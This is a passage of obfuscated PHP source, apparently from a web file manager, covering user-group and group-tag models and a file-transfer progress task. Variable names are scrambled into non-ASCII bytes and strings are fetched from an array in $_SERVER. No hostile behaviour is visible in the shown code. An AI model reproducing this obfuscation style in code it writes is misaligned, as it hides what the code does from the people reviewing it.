$°øá’¢[$ï·ııİÛ[$ÁŸ­¢‚[1969]]] ? $°øá’¢[$ï·ııİÛ[$ÁŸ­¢‚[1969]]] : array(); } unset($ï·ııİÛ); } protected function groupMerge($äÕ¿„²Æ) { $äÕ¿„²Æ = array_values(array_unique($äÕ¿„²Æ)); $ôµÜÛ»û = array(); for ($ï€òË« = 0; $ï€òË« < count($äÕ¿„²Æ); $ï€òË«++) { $¦ÂŠõØ´ = !1; for ($Ëï°¸Õ… = 0; $Ëï°¸Õ… < count($äÕ¿„²Æ); $Ëï°¸Õ…++) { if ($ï€òË« == $Ëï°¸Õ…) { continue; } if ($this->isParentOf($äÕ¿„²Æ[$Ëï°¸Õ…], $äÕ¿„²Æ[$ï€òË«])) { $¦ÂŠõØ´ = !0; break; } } if (!$¦ÂŠõØ´) { $ôµÜÛ»û[] = $äÕ¿„²Æ[$ï€òË«]; } } return $ôµÜÛ»û; } protected function isParentOf($¨½¯ ä, $é·âñêë) { $Œşô’Ò¹ =& $_SERVER[Ò°Ì”İ•]; if (!$¨½¯ ä || !$é·âñêë || $¨½¯ ä == $é·âñêë) { return !1; } $ËŒì»—» = $this->getInfoSimple($¨½¯ ä); $û¢»ô‡† = $this->getInfoSimple($é·âñêë); $æÁ¦§ = $ËŒì»—»[$Œşô’Ò¹[596]] . $¨½¯ ä . $Œşô’Ò¹[50]; if (substr($û¢»ô‡†[$Œşô’Ò¹[596]], 0, strlen($æÁ¦§)) == $æÁ¦§) { return !0; } return !1; } public function groupShowRoot($Œ­ó‰›, $¶ßÅñ°á = false) { $âƒ£×Ò” =& $_SERVER[Ò°Ì”İ•]; $›„õœóï = $this->getInfo($Œ­ó‰›); if (!$›„õœóï) { return array(); } $¢ÒÑê« = $this->parentLevelArray($›„õœóï[$âƒ£×Ò”[596]]); $Ä­¡Äà = array($Œ­ó‰›); if (count($¢ÒÑê«) == 0) { return $Ä­¡Äà; } if ($¶ßÅñ°á && count($¢ÒÑê«) == 1) { return $Ä­¡Äà; } if (!$›„õœóï[$âƒ£×Ò”[551]] || !isset($›„õœóï[$âƒ£×Ò”[551]][$âƒ£×Ò”[2059]]) || $›„õœóï[$âƒ£×Ò”[551]][$âƒ£×Ò”[2059]] == $âƒ£×Ò”[849]) { return $this->groupShowRoot($¢ÒÑê«[count($¢ÒÑê«) - 1], $¶ßÅñ°á); } if ($›„õœóï[$âƒ£×Ò”[551]][$âƒ£×Ò”[2059]] == $âƒ£×Ò”[444]) { $İÙèŠ€“ = explode($âƒ£×Ò”[50], $›„õœóï[$âƒ£×Ò”[551]][$âƒ£×Ò”[2060]]); if ($İÙèŠ€“) { $Ä­¡Äà = array_merge($Ä­¡Äà, $İÙèŠ€“); } } return $Ä­¡Äà; } protected function resetParentLevel() { $ºƒèƒ Ë =& $_SERVER[Ò°Ì”İ•]; $ã²êÖ¿Ñ = $ºƒèƒ Ë[1969]; $‰ñĞÖ š = $this->select(); $‰ñĞÖ š = array_to_keyvalue($‰ñĞÖ š, $ã²êÖ¿Ñ); foreach ($‰ñĞÖ š as $ÎİäÂÈ ) { $‰ïê·‚² = $ÎİäÂÈ ; $¤ˆ´êü£ = array(); while ($‰ïê·‚²[$ºƒèƒ Ë[203]] != 0) { $¤ˆ´êü£[] = $‰ïê·‚²[$ºƒèƒ Ë[203]]; $‰ïê·‚² = $‰ñĞÖ š[$‰ïê·‚²[$ºƒèƒ Ë[203]]]; } $¤ˆ´êü£[] = 0; $¤ˆ´êü£ = $ºƒèƒ Ë[50] . implode($ºƒèƒ Ë[50], array_reverse($¤ˆ´êü£)) . $ºƒèƒ Ë[50]; $this->setNamePinyin($ÎİäÂÈ [$ã²êÖ¿Ñ], $ÎİäÂÈ [$ºƒèƒ Ë[32]]); $this->where(array($ã²êÖ¿Ñ => $ÎİäÂÈ [$ã²êÖ¿Ñ]))->save(array($ºƒèƒ Ë[667] => $¤ˆ´êü£)); } return $‰ñĞÖ š; } public function groupNameAuto($Å²Æôş, $µŠœı Ê) { $œâ»ª·å =& $_SERVER[Ò°Ì”İ•]; $Çòã«Š = $this->where(array($œâ»ª·å[489] => $Å²Æôş))->getField($œâ»ª·å[32], !0); if (!$Çòã«Š || !in_array($µŠœı Ê, $Çòã«Š)) { return $µŠœı Ê; } for ($ºãöëÜ‰ = 1; $ºãöëÜ‰ <= count($Çòã«Š) + 1; $ºãöëÜ‰++) { $ü‰Ê·× = $µŠœı Ê . "\x28{$ºãöëÜ‰}\51"; if (!in_array($ü‰Ê·×, $Çòã«Š)) { return $ü‰Ê·×; } } } public function groupSwitch($ı²»…³Ä, $Á¡½£É¾) { $ğÈÍŒğø =& $_SERVER[Ò°Ì”İ•]; $¨·ûû‡Á = array($ğÈÍŒğø[1969] => array($ğÈÍŒğø[7], array($ı²»…³Ä, $Á¡½£É¾))); $š’•‘ø = $this->where($¨·ûû‡Á)->select(); $š’•‘ø = array_to_keyvalue($š’•‘ø, $ğÈÍŒğø[1969]); if (!isset($š’•‘ø[$ı²»…³Ä]) || !isset($š’•‘ø[$Á¡½£É¾]) || $š’•‘ø[$ı²»…³Ä][$ğÈÍŒğø[203]] == 0) { return !1; } $¨·ûû‡Á = array($ğÈÍŒğø[1969] => $ı²»…³Ä); $Ò‰»ÁŒ = Model($ğÈÍŒğø[2063])->where($¨·ûû‡Á)->select(); if (!$Ò‰»ÁŒ) { $Ò‰»ÁŒ = array(); } foreach ($Ò‰»ÁŒ as $ñŞ³öº«) { $ÀòÒŞÇ = $ñŞ³öº«[$ğÈÍŒğø[1768]]; $¨·ûû‡Á = array($ğÈÍŒğø[1768] => $ÀòÒŞÇ, $ğÈÍŒğø[1969] => $Á¡½£É¾); $¶áøŒŠÈ = Model($ğÈÍŒğø[2063])->where($¨·ûû‡Á)->find(); if (!$¶áøŒŠÈ) { $„–­›¦× = array($Á¡½£É¾ => $ñŞ³öº«[$ğÈÍŒğø[2077]]); Model($ğÈÍŒğø[609])->userGroupAdd($ÀòÒŞÇ, $„–­›¦×); } Model($ğÈÍŒğø[609])->userGroupRemove($ÀòÒŞÇ, $ı²»…³Ä); } $¨·ûû‡Á = array($ğÈÍŒğø[201] => 2, $ğÈÍŒğø[203] => 0, $ğÈÍŒğø[497] => 1, $ğÈÍŒğø[581] => array($ğÈÍŒğø[7], array($ı²»…³Ä, $Á¡½£É¾))); $¥…ÃÑÙ‚ = Model($ğÈÍŒğø[898])->where($¨·ûû‡Á)->field($ğÈÍŒğø[2078])->select(); $¥…ÃÑÙ‚ = array_to_keyvalue($¥…ÃÑÙ‚, $ğÈÍŒğø[581], $ğÈÍŒğø[204]); $½ª£¹¯â = !empty($¥…ÃÑÙ‚[$ı²»…³Ä]) ? $¥…ÃÑÙ‚[$ı²»…³Ä] : !1; if ($½ª£¹¯â) { if (!$¥…ÃÑÙ‚[$Á¡½£É¾]) { $¥…ÃÑÙ‚[$Á¡½£É¾] = Model($ğÈÍŒğø[898])->groupRootAdd($Á¡½£É¾); } $Ìö¶Åƒ” = $¥…ÃÑÙ‚[$Á¡½£É¾]; $¨·ûû‡Á = array($ğÈÍŒğø[203] => $½ª£¹¯â); $¥…ÃÑÙ‚ = Model($ğÈÍŒğø[898])->where($¨·ûû‡Á)->field($ğÈÍŒğø[2079])->select(); if (!$¥…ÃÑÙ‚) { $¥…ÃÑÙ‚ = array(); } Model($ğÈÍŒğø[898])->moveClearAuth = !1; foreach ($¥…ÃÑÙ‚ as $“ë¢Êß¸) { $ñ›¨åº² = $“ë¢Êß¸[$ğÈÍŒğø[497]] == $ğÈÍŒğø[102] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ğÈÍŒğø[898])->move($“ë¢Êß¸[$ğÈÍŒğø[204]], $Ìö¶Åƒ”, $ñ›¨åº²); } Model($ğÈÍŒğø[898])->moveClearAuth = !0; $¨·ûû‡Á = array($ğÈÍŒğø[201] => 2, $ğÈÍŒğø[581] => $ı²»…³Ä); $”´ÜÊç = array($ğÈÍŒğø[581] => $Á¡½£É¾); Model($ğÈÍŒğø[2080])->where($¨·ûû‡Á)->save($”´ÜÊç); Model($ğÈÍŒğø[2081])->where($¨·ûû‡Á)->save($”´ÜÊç); } $this->_changeChildLevel($š’•‘ø[$ı²»…³Ä], $š’•‘ø[$Á¡½£É¾], !0); $this->where(array($ğÈÍŒğø[203] => $ı²»…³Ä))->save(array($ğÈÍŒğø[203] => $Á¡½£É¾)); $this->_clearChildrenCache($š’•‘ø[$Á¡½£É¾]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\166"; protected function cacheFunctionAlias($¯ß¾¯é) { $‹çàïÆ÷ =& $_SERVER[Ò°Ì”İ•]; return array($‹çàïÆ÷[2082] => array($¯ß¾¯é[0], $‹çàïÆ÷[2083]), $‹çàïÆ÷[2084] => array($¯ß¾¯é[0], $‹çàïÆ÷[2085])); } protected function get($«ìÎÙ«) { $ıà¯°’ê =& $_SERVER[Ò°Ì”İ•]; $ï¿¥¬©° = Model($ıà¯°’ê[597])->metaGet($«ìÎÙ«, $ıà¯°’ê[2086]); $±¨Æ½ùâ = json_decode($ï¿¥¬©°, !0); return $±¨Æ½ùâ ? $±¨Æ½ùâ : array($ıà¯°’ê[2087] => $ıà¯°’ê[102], $ıà¯°’ê[457] => array()); } protected function set($²Õó¯, $Æö¾ô“) { $µ ÌŠÌ¤ =& $_SERVER[Ò°Ì”İ•]; $Æö¾ô“ = $Æö¾ô“ ? $Æö¾ô“ : array($µ ÌŠÌ¤[2087] => $µ ÌŠÌ¤[102], $µ ÌŠÌ¤[457] => array()); return Model($µ ÌŠÌ¤[597])->metaSet($²Õó¯, $µ ÌŠÌ¤[2086], json_encode($Æö¾ô“)); } protected function getByTagID($ö®×…Ÿ¤, $‚öÏÍ»ò) { $·âî— =& $_SERVER[Ò°Ì”İ•]; if (!$ö®×…Ÿ¤ || !$‚öÏÍ»ò) { return !1; } if (!Model($·âî—[597])->getInfoSimple($ö®×…Ÿ¤)) { return !1; } $¸¼¡ğ¬æ = $this->get($ö®×…Ÿ¤); if (!$¸¼¡ğ¬æ || !isset($¸¼¡ğ¬æ[$·âî—[457]])) { return !1; } $§‡Şº¢¾ = array_find_by_field($¸¼¡ğ¬æ[$·âî—[457]], $·âî—[487], $‚öÏÍ»ò); return is_array($§‡Şº¢¾) ? $§‡Şº¢¾ : !1; } public function listSource($ÛÍÀú¯½, $©Ùä–êô) { $İÚµ–å½ =& $_SERVER[Ò°Ì”İ•]; if ($©Ùä–êô && !is_array($©Ùä–êô)) { $©Ùä–êô = array($©Ùä–êô); } $®“¬á¬ï = $this->listData($ÛÍÀú¯½); $±ˆ—ÚÙ½ = array(); foreach ($®“¬á¬ï as $¡òèÀ£ú) { $ŠäÓ = $¡òèÀ£ú[$İÚµ–å½[98]]; if (!$ŠäÓ) { continue; } if (!isset($±ˆ—ÚÙ½[$ŠäÓ])) { $±ˆ—ÚÙ½[$ŠäÓ] = array(); } $±ˆ—ÚÙ½[$ŠäÓ][] = $¡òèÀ£ú[$İÚµ–å½[512]]; } $Â¬µ•¸† = array(); foreach ($±ˆ—ÚÙ½ as $§ùÍ±ªğ => $üİÊ–¬Í) { $è³µµíæ = !0; if (!$©Ùä–êô) { $Â¬µ•¸†[] = $§ùÍ±ªğ; continue; } foreach ($©Ùä–êô as $˜±ı°Û) { if (!in_array($˜±ı°Û, $üİÊ–¬Í)) { $è³µµíæ = !1; break; } } if ($è³µµíæ) { $Â¬µ•¸†[] = $§ùÍ±ªğ; } } if (!$Â¬µ•¸†) { return array(); } $¼êíµú† = array($İÚµ–å½[503] => array($İÚµ–å½[504], $Â¬µ•¸†), $İÚµ–å½[581] => $ÛÍÀú¯½, $İÚµ–å½[201] => SourceModel::TYPE_GROUP); $²ûÕ°¢ = Model($İÚµ–å½[1417])->listSource($¼êíµú†); if (!$²ûÕ°¢ || count($Â¬µ•¸†) == $²ûÕ°¢[$İÚµ–å½[454]][$İÚµ–å½[455]]) { return $²ûÕ°¢; } $¨ÌØÖôƒ = array(); $—¸·é…€ = array_to_keyvalue($²ûÕ°¢[$İÚµ–å½[96]], $İÚµ–å½[12], $İÚµ–å½[204]); $Õß…ÃÄÀ = array_to_keyvalue($²ûÕ°¢[$İÚµ–å½[97]], $İÚµ–å½[12], $İÚµ–å½[204]); $¹Èõß’¿ = array_merge($Õß…ÃÄÀ, $—¸·é…€); foreach ($Â¬µ•¸† as $ŠäÓ) { if (!in_array($ŠäÓ, $¹Èõß’¿)) { $¨ÌØÖôƒ[] = $ŠäÓ; } } if ($¨ÌØÖôƒ) { $this->removeBySource($ÛÍÀú¯½, $¨ÌØÖôƒ); } return $²ûÕ°¢; } protected function listData($±±Ï»°Ş) { $¹ù°ª¬Ê =& $_SERVER[Ò°Ì”İ•]; $°‚‹ŞŠò = array($¹ù°ª¬Ê[1759] => 0, $¹ù°ª¬Ê[569] => array($¹ù°ª¬Ê[2088], 0), $¹ù°ª¬Ê[508] => $¹ù°ª¬Ê[2089] . $±±Ï»°Ş); $Ğ÷Íå± = $¹ù°ª¬Ê[2090]; $Š„Ãœ¥¥ = $this->field($Ğ÷Íå±)->where($°‚‹ŞŠò)->order($¹ù°ª¬Ê[2091])->select(); return $Š„Ãœ¥¥ ? $Š„Ãœ¥¥ : array(); } protected function addToTag($¤ ¸±³¢, $øœğ¥åø, $”ÙÂÕ¹Ï) { $¦Ö¼êìå =& $_SERVER[Ò°Ì”İ•]; if (!$this->getByTagID($¤ ¸±³¢, $”ÙÂÕ¹Ï) || !$øœğ¥åø) { return !1; } if (!Model($¦Ö¼êìå[898])->pathInfo($øœğ¥åø)) { return !1; } $–ÂŞÃÔ¡ = array($¦Ö¼êìå[1759] => 0, $¦Ö¼êìå[569] => $”ÙÂÕ¹Ï, $¦Ö¼êìå[507] => $øœğ¥åø, $¦Ö¼êìå[508] => $¦Ö¼êìå[2092] . $¤ ¸±³¢, $¦Ö¼êìå[506] => $¦Ö¼êìå[12], $¦Ö¼êìå[1973] => 0); if ($this->where($–ÂŞÃÔ¡)->find()) { return !1; } return $this->add($–ÂŞÃÔ¡); } protected function removeFromTag($æ¸ÚëÕ, $ÑÓÉñòŒ, $£ŒÉÖ¡Ü) { $§Ö•ù•æ =& $_SERVER[Ò°Ì”İ•]; if (!$this->getByTagID($æ¸ÚëÕ, $£ŒÉÖ¡Ü) || !$ÑÓÉñòŒ) { return !1; } if (is_array($ÑÓÉñòŒ)) { $ÑÓÉñòŒ = array($§Ö•ù•æ[7], $ÑÓÉñòŒ); } $Æ·åûŞ¾ = array($§Ö•ù•æ[1759] => 0, $§Ö•ù•æ[569] => $£ŒÉÖ¡Ü, $§Ö•ù•æ[508] => $§Ö•ù•æ[2092] . $æ¸ÚëÕ, $§Ö•ù•æ[507] => $ÑÓÉñòŒ); return $this->where($Æ·åûŞ¾)->delete(); } protected function removeByTag($àÚ»²Ñà, $Ê–Ô×Ÿ) { $òÆøûüí =& $_SERVER[Ò°Ì”İ•]; if (!$this->getByTagID($àÚ»²Ñà, $Ê–Ô×Ÿ)) { return !1; } $Ê‚Öê¿ = array($òÆøûüí[1759] => 0, $òÆøûüí[569] => $Ê–Ô×Ÿ, $òÆøûüí[508] => $òÆøûüí[2092] . $àÚ»²Ñà); return $this->where($Ê‚Öê¿)->delete(); } protected function removeBySource($ÔÈœ¨¼‘, $ºÒÒ¢€) { $‰ûå¸Û =& $_SERVER[Ò°Ì”İ•]; if (!$ÔÈœ¨¼‘ || !$ºÒÒ¢€) { return !1; } if (is_array($ºÒÒ¢€)) { $ºÒÒ¢€ = array($‰ûå¸Û[7], $ºÒÒ¢€); } $Î¨ü§ØŠ = array($‰ûå¸Û[1759] => 0, $‰ûå¸Û[507] => $ºÒÒ¢€, $‰ûå¸Û[569] => array($‰ûå¸Û[1087], 0), $‰ûå¸Û[508] => $‰ûå¸Û[2092] . $ÔÈœ¨¼‘); return $this->where($Î¨ü§ØŠ)->delete(); } } goto b¶äšÙÌ’¨; cï®™‡ªŒÀ: class TaskFileTransfer extends Task { protected function startAfter() { $‡ÕæÑ”¢ =& $_SERVER[Ò°Ì”İ•]; $ÂŠ‹Æà =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($‡ÕæÑ”¢[1799], array($this, $‡ÕæÑ”¢[1800])); Hook::bind($‡ÕæÑ”¢[1304], array($this, $‡ÕæÑ”¢[1801])); Hook::bind($‡ÕæÑ”¢[1802], array($this, $‡ÕæÑ”¢[1803])); Hook::bind($‡ÕæÑ”¢[683], array($this, $‡ÕæÑ”¢[1804])); Hook::bind($‡ÕæÑ”¢[684], array($this, $‡ÕæÑ”¢[1805])); Hook::bind($‡ÕæÑ”¢[690], array($this, $‡ÕæÑ”¢[1806])); Hook::bind($‡ÕæÑ”¢[691], array($this, $‡ÕæÑ”¢[1807])); Hook::bind($‡ÕæÑ”¢[686], array($this, $‡ÕæÑ”¢[1808])); Hook::bind($‡ÕæÑ”¢[688], array($this, $‡ÕæÑ”¢[1809])); Hook::bind($‡ÕæÑ”¢[652], array($this, $‡ÕæÑ”¢[1810])); Hook::bind($‡ÕæÑ”¢[649], array($this, $‡ÕæÑ”¢[1810])); Hook::bind($‡ÕæÑ”¢[654], array($this, $‡ÕæÑ”¢[1810])); Hook::bind($‡ÕæÑ”¢[656], array($this, $‡ÕæÑ”¢[1810])); Hook::bind($‡ÕæÑ”¢[658], array($this, $‡ÕæÑ”¢[1810])); Hook::bind($‡ÕæÑ”¢[1811], array($this, $‡ÕæÑ”¢[1812])); Hook::bind($‡ÕæÑ”¢[674], array($this, $‡ÕæÑ”¢[1813])); $this->sourceModelCopyFlag = !1; Hook::bind($‡ÕæÑ”¢[1814], array($this, $‡ÕæÑ”¢[1815])); Hook::bind($‡ÕæÑ”¢[1816], array($this, $‡ÕæÑ”¢[1817])); Hook::bind($‡ÕæÑ”¢[1818], array($this, $‡ÕæÑ”¢[1819])); $ÂŠ‹Æà[$‡ÕæÑ”¢[1820]] = LNG($‡ÕæÑ”¢[1821]); $ÂŠ‹Æà[$‡ÕæÑ”¢[1822]] = 0; $ÂŠ‹Æà[$‡ÕæÑ”¢[1823]] = 0; $ÂŠ‹Æà[$‡ÕæÑ”¢[1138]] = $‡ÕæÑ”¢[12]; $ÂŠ‹Æà[$‡ÕæÑ”¢[1824]] = $‡ÕæÑ”¢[12]; $ÂŠ‹Æà[$‡ÕæÑ”¢[1825]] = 0; $ÂŠ‹Æà[$‡ÕæÑ”¢[1826]] = 0; $ÂŠ‹Æà[$‡ÕæÑ”¢[1827]] = 0; if (!$ÂŠ‹Æà[$‡ÕæÑ”¢[1656]]) { $ÂŠ‹Æà[$‡ÕæÑ”¢[1656]] = LNG($‡ÕæÑ”¢[1828]); } } protected function endAfter() { $§ˆç‹ =& $_SERVER[Ò°Ì”İ•]; Hook::unbind($§ˆç‹[1799], array($this, $§ˆç‹[1800])); Hook::unbind($§ˆç‹[1304], array($this, $§ˆç‹[1801])); Hook::unbind($§ˆç‹[1802], array($this, $§ˆç‹[1803])); Hook::unbind($§ˆç‹[683], array($this, $§ˆç‹[1804])); Hook::unbind($§ˆç‹[684], array($this, $§ˆç‹[1805])); Hook::unbind($§ˆç‹[690], array($this, $§ˆç‹[1806])); Hook::unbind($§ˆç‹[691], array($this, $§ˆç‹[1807])); Hook::unbind($§ˆç‹[686], array($this, $§ˆç‹[1808])); Hook::unbind($§ˆç‹[688], array($this, $§ˆç‹[1809])); Hook::unbind($§ˆç‹[652], array($this, $§ˆç‹[1810])); Hook::unbind($§ˆç‹[649], array($this, $§ˆç‹[1810])); Hook::unbind($§ˆç‹[654], array($this, $§ˆç‹[1810])); Hook::unbind($§ˆç‹[656], array($this, $§ˆç‹[1810])); Hook::unbind($§ˆç‹[658], array($this, $§ˆç‹[1810])); Hook::unbind($§ˆç‹[1811], array($this, $§ˆç‹[1812])); Hook::unbind($§ˆç‹[674], array($this, $§ˆç‹[1813])); Hook::unbind($§ˆç‹[1814], array($this, $§ˆç‹[1815])); Hook::unbind($§ˆç‹[1816], array($this, $§ˆç‹[1817])); Hook::unbind($§ˆç‹[1818], array($this, $§ˆç‹[1819])); } public function copyMoveStart($®©ããùÛ, $åîóæ¬, $Ñ¾Ç»Æº, $¦İğ¥›Ã) { $ğ”‘‚Õ =& $_SERVER[Ò°Ì”İ•]; self::log($ğ”‘‚Õ[1829] . $åîóæ¬ . $ğ”‘‚Õ[84] . $¦İğ¥›Ã); $ËÑÜ€ª = rtrim(TEMP_FILES, $ğ”‘‚Õ[8]); if (substr($åîóæ¬, 0, strlen($ËÑÜ€ª)) == $ËÑÜ€ª) { return; } if (substr($¦İğ¥›Ã, 0, strlen($ËÑÜ€ª)) == $ËÑÜ€ª) { return; } $ù‡ÈîÀ½ =& $this->task; $ù‡ÈîÀ½[$ğ”‘‚Õ[1830]] = KodIO::transferType($®©ããùÛ, $Ñ¾Ç»Æº); $this->update(); } public function updateAfter() { $êœ£Ô‰ü =& $_SERVER[Ò°Ì”İ•]; $—ŠŞ™‹ï =& $this->task; if (!$—ŠŞ™‹ï[$êœ£Ô‰ü[836]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($—ŠŞ™‹ï[$êœ£Ô‰ü[1830]] == $êœ£Ô‰ü[1398]) { return; } self::updateTask($—ŠŞ™‹ï); } private static function updateTask(&$„ˆ÷£–œ) { $‘ÕÎÏæ =& $_SERVER[Ò°Ì”İ•]; if ($„ˆ÷£–œ[$‘ÕÎÏæ[1830]] == $‘ÕÎÏæ[1275] || $„ˆ÷£–œ[$‘ÕÎÏæ[1830]] == $‘ÕÎÏæ[121]) { if ($„ˆ÷£–œ[$‘ÕÎÏæ[1824]]) { $„ˆ÷£–œ[$‘ÕÎÏæ[1827]] = $„ˆ÷£–œ[$‘ÕÎÏæ[1826]] + $„ˆ÷£–œ[$‘ÕÎÏæ[1823]]; } } else { if ($„ˆ÷£–œ[$‘ÕÎÏæ[1830]] == $‘ÕÎÏæ[1399]) { if ($„ˆ÷£–œ[$‘ÕÎÏæ[1824]] == $‘ÕÎÏæ[1275]) { $„ˆ÷£–œ[$‘ÕÎÏæ[1827]] = $„ˆ÷£–œ[$‘ÕÎÏæ[1826]] + $„ˆ÷£–œ[$‘ÕÎÏæ[1823]] * 0.5; } else { if ($„ˆ÷£–œ[$‘ÕÎÏæ[1824]] == $‘ÕÎÏæ[121]) { $„ˆ÷£–œ[$‘ÕÎÏæ[1827]] = $„ˆ÷£–œ[$‘ÕÎÏæ[1826]] + $„ˆ÷£–œ[$‘ÕÎÏæ[1822]] * 0.5 + $„ˆ÷£–œ[$‘ÕÎÏæ[1823]] * 0.5; } } } } $„ˆ÷£–œ[$‘ÕÎÏæ[1770]] = $„ˆ÷£–œ[$‘ÕÎÏæ[1827]] / $„ˆ÷£–œ[$‘ÕÎÏæ[836]]; if ($„ˆ÷£–œ[$‘ÕÎÏæ[1770]] > 0) { $Ú´…‚Ö = timeFloat() - $„ˆ÷£–œ[$‘ÕÎÏæ[1772]] - $„ˆ÷£–œ[$‘ÕÎÏæ[1775]]; $„ˆ÷£–œ[$‘ÕÎÏæ[1776]] = $Ú´…‚Ö * (1 - $„ˆ÷£–œ[$‘ÕÎÏæ[1770]]) / $„ˆ÷£–œ[$‘ÕÎÏæ[1770]]; } } public function addPath($şëİ³Ì´) { $ÕàÑ´¢¤ =& $_SERVER[Ò°Ì”İ•]; if (!$şëİ³Ì´) { return; } $é§øì– =& $this->task; $¿¶Ğí¾ = IO::infoWithChildren($şëİ³Ì´); $ÒùàÎÎà = $é§øì–[$ÕàÑ´¢¤[1831]] ? $é§øì–[$ÕàÑ´¢¤[1831]][$ÕàÑ´¢¤[1832]] : 0; $é§øì–[$ÕàÑ´¢¤[1831]] = array($ÕàÑ´¢¤[1832] => $ÒùàÎÎà + 1, $ÕàÑ´¢¤[506] => $¿¶Ğí¾[$ÕàÑ´¢¤[32]], $ÕàÑ´¢¤[98] => $¿¶Ğí¾[$ÕàÑ´¢¤[98]], $ÕàÑ´¢¤[594] => $¿¶Ğí¾[$ÕàÑ´¢¤[594]] ? $¿¶Ğí¾[$ÕàÑ´¢¤[594]] : $¿¶Ğí¾[$ÕàÑ´¢¤[98]]); if ($¿¶Ğí¾[$ÕàÑ´¢¤[33]] == $ÕàÑ´¢¤[243]) { $é§øì–[$ÕàÑ´¢¤[1136]] += 1; } else { $é§øì–[$ÕàÑ´¢¤[1136]] += $¿¶Ğí¾[$ÕàÑ´¢¤[93]][$ÕàÑ´¢¤[91]]; if ($¿¶Ğí¾[$ÕàÑ´¢¤[204]]) { $é§øì–[$ÕàÑ´¢¤[1136]] += $¿¶Ğí¾[$ÕàÑ´¢¤[93]][$ÕàÑ´¢¤[92]] + 1; } } $é§øì–[$ÕàÑ´¢¤[836]] += $¿¶Ğí¾[$ÕàÑ´¢¤[90]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ã÷ŒÀ¨) { } public function sourceAddHashEnd($ÔìâãŸ¥) { } public function sourceAddFileStart($·ğµÉÑÁ) { $®†à¡˜Ò =& $_SERVER[Ò°Ì”İ•]; $ƒéúâ®Ë =& $this->task; $ƒéúâ®Ë[$®†à¡˜Ò[1822]] = $·ğµÉÑÁ[$®†à¡˜Ò[90]]; $ƒéúâ®Ë[$®†à¡˜Ò[1820]] = $·ğµÉÑÁ[$®†à¡˜Ò[32]]; $ƒéúâ®Ë[$®†à¡˜Ò[1138]] = $·ğµÉÑÁ[$®†à¡˜Ò[32]]; $ƒéúâ®Ë[$®†à¡˜Ò[1833]] = $·ğµÉÑÁ[$®†à¡˜Ò[98]]; $this->update(); } public function sourceAddFileEnd($èê¬Òˆ´) { $ ¡ñ”ˆ¬ =& $_SERVER[Ò°Ì”İ•]; $ÁÇªè =& $this->task; $ÁÇªè[$ ¡ñ”ˆ¬[1827]] += $èê¬Òˆ´[$ ¡ñ”ˆ¬[90]]; $ÁÇªè[$ ¡ñ”ˆ¬[1833]] = $èê¬Òˆ´[$ ¡ñ”ˆ¬[98]]; $this->update(1); } public function copyFileStart($Î¥Ä´¨º, $íòÏÚ¯è, $¹‡˜Ë¿à, $ÔŒ×ÛõÚ, $ª‡äÌÍö, $ĞáÔò­) { $ˆı†¾Ó =& $_SERVER[Ò°Ì”İ•]; $ğßŒßñ = $ª‡äÌÍö; if ($ğßŒßñ == $GLOBALS[$ˆı†¾Ó[1834]]) { $ğßŒßñ = $GLOBALS[$ˆı†¾Ó[1835]]; } $GLOBALS[$ˆı†¾Ó[1835]] = $ª‡äÌÍö; $GLOBALS[$ˆı†¾Ó[1834]] = $ĞáÔò­; $¢¬ÍŞÇİ =& $this->task; $¢¬ÍŞÇİ[$ˆı†¾Ó[1820]] = $ğßŒßñ; $¢¬ÍŞÇİ[$ˆı†¾Ó[1822]] = (int) $Î¥Ä´¨º->size($íòÏÚ¯è); $¢¬ÍŞÇİ[$ˆı†¾Ó[1823]] = 0; $¢¬ÍŞÇİ[$ˆı†¾Ó[1138]] = $ˆı†¾Ó[12]; $¢¬ÍŞÇİ[$ˆı†¾Ó[1824]] = $ˆı†¾Ó[12]; $¢¬ÍŞÇİ[$ˆı†¾Ó[1825]] = 0; $Í´ıÔìß = $¢¬ÍŞÇİ[$ˆı†¾Ó[1822]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¢¬ÍŞÇİ[$ˆı†¾Ó[487]] . $ˆı†¾Ó[1836]); if ($Í´ıÔìß && file_exists(get_path_father($ÔŒ×ÛõÚ))) { Cache::set($¢¬ÍŞÇİ[$ˆı†¾Ó[487]] . $ˆı†¾Ó[1836], $ÔŒ×ÛõÚ); $¢¬ÍŞÇİ[$ˆı†¾Ó[1793]] = array($ˆı†¾Ó[1837], $ˆı†¾Ó[1838]); } $this->update(0, $Í´ıÔìß); } public static function updateCopyLocalFileSize($™™Ÿøúç) { $àíª–Ò¬ =& $_SERVER[Ò°Ì”İ•]; $Òİ½›’ = Cache::get($™™Ÿøúç[$àíª–Ò¬[487]] . $àíª–Ò¬[1836]); if (!$Òİ½›’ || !file_exists($Òİ½›’)) { return $™™Ÿøúç; } $™™Ÿøúç[$àíª–Ò¬[1823]] = @filesize($Òİ½›’); $™™Ÿøúç[$àíª–Ò¬[1827]] += $™™Ÿøúç[$àíª–Ò¬[1823]]; self::updateTask($™™Ÿøúç); return $™™Ÿøúç; } public function copyFileEnd($î˜Øí, $×ßÀ¯€, $¼‹Ğ…º, $İ€Ù˜è, $œÖ¬£«•, $š¸ñø†) { $ÓÅ½‘ç =& $_SERVER[Ò°Ì”İ•]; $Á˜ˆÆ± =& $this->task; $Á˜ˆÆ±[$ÓÅ½‘ç[1823]] = $Á˜ˆÆ±[$ÓÅ½‘ç[1822]]; $Á˜ˆÆ±[$ÓÅ½‘ç[1824]] = $ÓÅ½‘ç[12]; unset($Á˜ˆÆ±[$ÓÅ½‘ç[1793]]); if ($œÖ¬£«• == $Á˜ˆÆ±[$ÓÅ½‘ç[1820]]) { $Á˜ˆÆ±[$ÓÅ½‘ç[1826]] += $Á˜ˆÆ±[$ÓÅ½‘ç[1822]]; $Á˜ˆÆ±[$ÓÅ½‘ç[1827]] = $Á˜ˆÆ±[$ÓÅ½‘ç[1826]]; $±à¸¤¾ = 1; if (isset($Á˜ˆÆ±[$ÓÅ½‘ç[1833]]) && $Á˜ˆÆ±[$ÓÅ½‘ç[1833]] == $×ßÀ¯€) { $±à¸¤¾ = 0; } $this->update($±à¸¤¾); } else { $this->update(); $Á˜ˆÆ±[$ÓÅ½‘ç[1823]] = 0; } Cache::remove($Á˜ˆÆ±[$ÓÅ½‘ç[487]] . 